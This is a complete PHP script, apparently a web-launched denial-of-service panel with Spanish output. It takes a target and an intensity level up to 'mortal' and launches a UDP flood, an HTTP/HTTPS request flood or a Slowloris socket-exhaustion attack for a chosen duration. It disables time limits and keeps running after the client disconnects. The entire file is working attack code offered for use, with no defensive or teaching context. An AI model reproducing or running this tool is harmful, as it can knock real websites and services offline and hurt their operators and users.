<?php
header('Content-Type: text/plain; charset=utf-8');
set_time_limit(0);
ignore_user_abort(true);

$target     = trim($_POST['target'] ?? '');
$type       = $_POST['type'] ?? 'udp';
$intensity  = $_POST['intensity'] ?? 'media';
$duration   = max(1, (int)($_POST['duration'] ?? 30));
$unit       = $_POST['unit'] ?? 's';

if (!$target) {
    echo "[!] Objetivo vacío\n";
    exit;
}

// Convert duration to seconds
$seconds = $duration;
if ($unit === 'm') $seconds = $duration * 60;
if ($unit === 'h') $seconds = $duration * 3600;

// Intensity map → threads / sockets / packet size
$map = [
    'suave'    => ['threads' => 8,   'sockets' => 30,  'size' => 512],
    'baja'     => ['threads' => 20,  'sockets' => 80,  'size' => 1024],
    'media'    => ['threads' => 50,  'sockets' => 150, 'size' => 2048],
    'alta'     => ['threads' => 120, 'sockets' => 300, 'size' => 4096],
    'bastante' => ['threads' => 250, 'sockets' => 500, 'size' => 8192],
    'mortal'   => ['threads' => 500, 'sockets' => 900, 'size' => 16384],
];

$cfg = $map[$intensity] ?? $map['media'];
$threads = $cfg['threads'];
$sockets = $cfg['sockets'];
$size    = $cfg['size'];

echo "[*] Objetivo   : $target\n";
echo "[*] Tipo       : " . strtoupper($type) . "\n";
echo "[*] Intensidad : $intensity\n";
echo "[*] Duración   : $duration $unit ($seconds s)\n";
echo "[*] Threads    : $threads | Sockets: $sockets\n";
echo str_repeat("-", 40) . "\n";

$start = time();
$end   = $start + $seconds;

function parse_target($target) {
    $target = preg_replace('#^https?://#', '', $target);
    $parts = explode(':', $target);
    $host = $parts[0];
    $port = isset($parts[1]) ? (int)$parts[1] : null;
    return [$host, $port];
}

if ($type === 'udp') {
    [$host, $port] = parse_target($target);
    $port = $port ?: 80;
    echo "[+] UDP FLOOD iniciado → $host:$port\n";

    $payload = random_bytes($size);
    $sent = 0;

    while (time() < $end) {
        for ($i = 0; $i < $threads; $i++) {
            $sock = @socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
            if ($sock) {
                @socket_sendto($sock, $payload, strlen($payload), 0, $host, $port);
                @socket_close($sock);
                $sent++;
            }
        }
        if ($sent % 500 === 0) {
            echo "[>] $sent paquetes enviados...\n";
            flush();
        }
    }
    echo "[+] UDP terminado. Paquetes: $sent\n";

} elseif ($type === 'http' || $type === 'https') {
    $url = $target;
    if (!preg_match('#^https?://#', $url)) {
        $url = ($type === 'https' ? 'https://' : 'http://') . $url;
    }
    echo "[+] " . strtoupper($type) . " FLOOD → $url\n";

    $agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)',
    ];

    $sent = 0;
    while (time() < $end) {
        for ($i = 0; $i < $threads; $i++) {
            $ctx = stream_context_create([
                'http' => [
                    'method'  => 'GET',
                    'header'  => "User-Agent: " . $agents[array_rand($agents)] . "\r\n",
                    'timeout' => 2,
                    'ignore_errors' => true
                ],
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false
                ]
            ]);
            @file_get_contents($url, false, $ctx);
            $sent++;
        }
        if ($sent % 200 === 0) {
            echo "[>] $sent requests enviados...\n";
            flush();
        }
    }
    echo "[+] HTTP/S terminado. Requests: $sent\n";

} elseif ($type === 'slow') {
    [$host, $port] = parse_target($target);
    $port = $port ?: 80;
    echo "[+] SLOWLORIS → $host:$port | $sockets sockets\n";

    $list = [];
    for ($i = 0; $i < $sockets; $i++) {
        $s = @fsockopen($host, $port, $errno, $errstr, 3);
        if ($s) {
            stream_set_blocking($s, false);
            fwrite($s, "GET /?" . rand(0,99999) . " HTTP/1.1\r\n");
            fwrite($s, "Host: $host\r\n");
            fwrite($s, "User-Agent: Mozilla/5.0\r\n");
            fwrite($s, "Accept-Language: en-US,en;q=0.5\r\n");
            $list[] = $s;
        }
    }
    echo "[+] " . count($list) . " sockets abiertos\n";

    while (time() < $end) {
        foreach ($list as $k => $s) {
            if (!is_resource($s) || feof($s)) {
                unset($list[$k]);
                $news = @fsockopen($host, $port, $errno, $errstr, 2);
                if ($news) {
                    stream_set_blocking($news, false);
                    fwrite($news, "GET /?" . rand(0,99999) . " HTTP/1.1\r\nHost: $host\r\n");
                    $list[] = $news;
                }
                continue;
            }
            @fwrite($s, "X-a: " . rand(1,5000) . "\r\n");
        }
        echo "[>] sockets activos: " . count($list) . "\n";
        flush();
        sleep(8);
    }
    foreach ($list as $s) @fclose($s);
    echo "[+] Slowloris terminado\n";
}

echo str_repeat("-", 40) . "\n";
echo "[*] Tiempo real: " . (time() - $start) . "s\n";
echo "[*] FIN\n";
